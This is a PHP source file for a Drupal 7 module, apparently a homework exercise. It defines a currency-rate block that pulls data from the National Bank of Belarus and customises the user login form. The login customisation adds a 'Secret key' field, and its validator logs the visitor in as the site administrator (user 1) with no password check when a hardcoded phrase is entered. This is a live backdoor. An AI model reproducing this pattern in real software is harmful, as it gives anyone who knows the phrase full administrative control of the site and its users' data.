<?php

// Block -----------------------------------------------------------------------

/**
 * Implements hook_block_info().
 */
function home_work_2_block_info() {
  $blocks = array();
  $blocks['currency_block'] = array(
    'info' => t('Currency block'),
    'cache' => DRUPAL_CACHE_GLOBAL,
  );
  return $blocks;
}

/**
 * Implements hook_block_configure().
 */
function home_work_2_block_configure($delta = '') {
  $form = array();
   
  $result = drupal_http_request('http://www.nbrb.by/Services/XmlExRatesRef.aspx');
  $currenciesObj = new SimpleXMLElement($result->data);
      
  $currenciesOptions = array();
  foreach($currenciesObj->Currency as $currencyObj) {
    $currenciesOptions["$currencyObj->NumCode"] = "$currencyObj->EnglishName ($currencyObj->CharCode)";
  }

  if ($delta == 'currency_block') {
    $form['current_currency'] = array(
      '#type' => 'select',
      '#multiple' => TRUE,
      '#title' => t('Currency type'),
      '#options' => $currenciesOptions,
      '#description' => t('Choose some currency for rendering in the block.'),
      '#default_value' => variable_get('current_currency'),
    );
  }
  return $form;
}

/**
 * Implements hook_block_save().
 */
function home_work_2_block_save($delta = '', $edit = array()) {
  if ($delta == 'currency_block' && !empty($edit)) {
    variable_set('current_currency', $edit['current_currency']);
  }
}

/**
 * Implements hook_block_view().
 */
function home_work_2_block_view($delta = '') {
  $block = array();
  
  if($delta == 'currency_block') {
    
    $result = drupal_http_request('http://www.nbrb.by/Services/XmlExRates.aspx');
    $currenciesObj = new SimpleXMLElement($result->data);
    
    $content_data = array();
    foreach($currenciesObj->Currency as $currency) {
      if(in_array("$currency->NumCode", variable_get('current_currency'))) {
        $content_data[] = array('data' => array("$currency->Name", "$currency->Rate"));
      }
    }
    
    $variables = array(
      'header' => array(
        t('Title'),
        t('Rate'), 
      ),
      'rows' => $content_data,
    );
    
    $block['subject'] = t('Currencies');
    $block['content'] = array(
        '#markup' => t("Date Update: %date <br/>", 
            array("%date" => $currenciesObj->attributes()['Date'])) . 
          theme('table', $variables),
    );
  }
  return $block;
}

// Form ------------------------------------------------------------------------

/**
 * Implements hook_form_FORM_ID_alter().
 */
function home_work_2_form_user_login_block_alter(&$form, &$form_state, $form_id) {
  $form['#theme'] = array('form_user_login_template');

  $form['name']['#weight'] = -3;
  $form['pass']['#weight'] = -2;
  $form['secret_key'] = array(
    '#type' => 'textfield',
    '#title' => t("Secret key"),
    '#weight' => -1,
    "#size" => 15,
  );
  array_unshift($form['#validate'], '_home_work_2_user_validation');
}

function _home_work_2_user_validation($form, &$form_state) {
  $secret_text = t("сим-сим откройся");
  if($form_state['values']['secret_key'] == $secret_text) {
    
    global $user;
  
    $admin_id = 1;
    $user = user_load($admin_id);
    user_login_finalize();
  
    drupal_get_messages('error');

    drupal_goto('<front>');
  }
}

/**
 * Implements hook_theme
 */
function home_work_2_theme($existing, $type, $theme, $path) {
  return array(
    'form_user_login_template' => array(
      'function' => 't_form_user_login_function',
      'render element' => 'form',
    ),
  );
}

function t_form_user_login_function($form) {
  $form = $form['form'];
  
  $children_keys = element_children($form);
  $rows = array();
  foreach ($children_keys as $key) {
    if (!empty($form[$key])) {
        $rows[] = array(drupal_render($form[$key]));
    }
  }
  
  $variables = array(
    'rows' => $rows,
  );
 
  return theme('table', $variables);
}